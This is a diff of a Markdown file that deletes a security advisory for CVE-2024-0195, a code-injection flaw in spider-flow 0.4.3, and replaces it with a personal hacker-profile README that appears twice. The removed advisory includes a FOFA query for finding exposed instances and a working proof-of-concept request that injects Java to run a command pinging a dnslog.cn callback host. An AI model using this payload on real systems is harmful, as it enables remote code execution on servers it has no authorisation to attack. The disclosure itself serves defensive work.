@@ -1,31 +1,114 @@
-# CVE-2024-0195 Improper Control of Generation of Code ('Code Injection')
+README
 
-# Summary
-CVE-2024-0195 is a critical code injection vulnerability in the spider-flow 0.4.3 web application, specifically in the FunctionService.saveFunction function of the FunctionController.java file. An attacker can remotely inject malicious code which gets executed on the server. This allows complete compromise of the application.
+<p align="center"><img src="https://github.com/user-attachments/assets/e26d1d6a-30ee-488e-90ca-11b3aa180148" width="100%" height="auto"/></p>
 
-# Impact
-This vulnerability is extremely severe as it allows remote code execution on the server hosting the vulnerable spider-flow application. An attacker could fully compromise the server, steal sensitive data, install malware or crypto miners, and use it for further attacks inside the network. The confidentiality, integrity and availability of the application and server are all critically impacted.
-
-# Patch
-A patched version is not explicitly mentioned, so patching currently does not seem to be an option. The vulnerability was publicly disclosed and exploits are available, so immediate mitigation is critical.
-
-# Mitigation
-Until an official patch is released, spider-flow 0.4.3 should be immediately taken offline or access restricted only to trusted networks/users. Web application firewalls or other input validation controls could potentially be configured to detect and block attempted code injection attacks as an interim mitigation. However, these are not full solutions and the vulnerable version should be upgraded as soon as a fixed release is available.
-
-CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+<div align="center">
+  <a href="https://git.io/typing-svg">
+    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=22F700&width=435&lines=On+journey+to+become+a+great+Hacker" alt="Typing SVG" />
+  </a>
+</div>
+<!--
+<h3 align="center">On a Journey to become a great human being...<p align="right"></h3> -->
 
 
-# Exploitation
-FOFA : app="spiderflow"
+<img width="28%" align='right' src="https://github.com/user-attachments/assets/466fee29-c3cf-4aa3-8807-6d0daaa4e6cf">
 
-✔ Proof of concept 
 
-```
-POST /function/save HTTP/1.1
-Host: 192.168.116.128:8080
-X-Requested-With: XMLHttpRequest
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Content-Length: 139
+<h2 align="left">
+  Hi there
+  <img src="https://media.giphy.com/media/hvRJCLFzcasrR4ia7z/giphy.gif" width="25px"/>
+</h2>
 
-id=&name=test&parameter=test&script=return+java.lang.%2F****%2FRuntime%7D%3Br%3Dtest()%3Br.getRuntime().exec('ping+18k2tu.dnslog.cn')%3B%7B
-```
+I'm **[Muhammad Waseem](https://www.youtube.com/@MuhammadWaseem17397)**, a hacker & Security Researcher. I'm on my way to becoming a **Cybersecurity Specialists** or a **Bug hunter**. <br>
+**Technology** has always fascinated me, and I've immersed myself in the captivating world of cyber security. Malwares, Viruses, Bug hunting,I hope I will become a Cybersecurity Specialists then I can protect company assests and help community.
+
+
+<details>
+  <summary>More about me</summary>
+
+- **Name**: Waseem
+- **From**: Pakistan
+- **Bug Hunter** | **Security Researcher** | **forensics Expert**
+- i have experience in cracking,reverse Engineering,bug Hunting,forensics,Social engineering,spy agent.
+-**Reverse Engineering**, **Malware Analysis**
+- Improving knowledge in **Website Vulnerabilities**
+- I’m currently learning **everything** 
+- Reach me out at **muhammadwaseem@bugcrowdninja.com**
+
+</details>
+<br>
+
+
+---
+
+<h2 id="present_status"> Present Status </h3>
+
+<img width="25%" align='right' src="https://github.com/user-attachments/assets/9c826dd0-fd72-49ba-af60-e79f64344f59">
+
+👉 Still Learning Bug hunting & malware forensics.
+
+👉 Managing Tech Communities & Content creator.
+
+👉 Writing Some Useful Tools For Myself & Communities
+
+👉 Building & Contributing To Open Source Projects
+
+👉 Currently Learning mobile pentesting & web3 
+
+README
+
+<p align="center"><img src="https://github.com/user-attachments/assets/e26d1d6a-30ee-488e-90ca-11b3aa180148" width="100%" height="auto"/></p>
+
+<div align="center">
+  <a href="https://git.io/typing-svg">
+    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=22F700&width=435&lines=On+journey+to+become+a+great+Hacker" alt="Typing SVG" />
+  </a>
+</div>
+<!--
+<h3 align="center">On a Journey to become a great human being...<p align="right"></h3> -->
+
+
+<img width="28%" align='right' src="https://github.com/user-attachments/assets/466fee29-c3cf-4aa3-8807-6d0daaa4e6cf">
+
+
+<h2 align="left">
+  Hi there
+  <img src="https://media.giphy.com/media/hvRJCLFzcasrR4ia7z/giphy.gif" width="25px"/>
+</h2>
+
+I'm **[Muhammad Waseem](https://www.youtube.com/@MuhammadWaseem17397)**, a hacker & Security Researcher. I'm on my way to becoming a **Cybersecurity Specialists** or a **Bug hunter**. <br>
+**Technology** has always fascinated me, and I've immersed myself in the captivating world of cyber security. Malwares, Viruses, Bug hunting,I hope I will become a Cybersecurity Specialists then I can protect company assests and help community.
+
+
+<details>
+  <summary>More about me</summary>
+
+- **Name**: Waseem
+- **From**: Pakistan
+- **Bug Hunter** | **Security Researcher** | **forensics Expert**
+- i have experience in cracking,reverse Engineering,bug Hunting,forensics,Social engineering,spy agent.
+-**Reverse Engineering**, **Malware Analysis**
+- Improving knowledge in **Website Vulnerabilities**
+- I’m currently learning **everything** 
+- Reach me out at **muhammadwaseem@bugcrowdninja.com**
+
+</details>
+<br>
+
+
+---
+
+<h2 id="present_status"> Present Status </h3>
+
+<img width="25%" align='right' src="https://github.com/user-attachments/assets/9c826dd0-fd72-49ba-af60-e79f64344f59">
+
+👉 Still Learning Bug hunting & malware forensics.
+
+👉 Managing Tech Communities & Content creator.
+
+👉 Writing Some Useful Tools For Myself & Communities
+
+👉 Building & Contributing To Open Source Projects
+
+👉 Currently Learning mobile pentesting & web3 
+
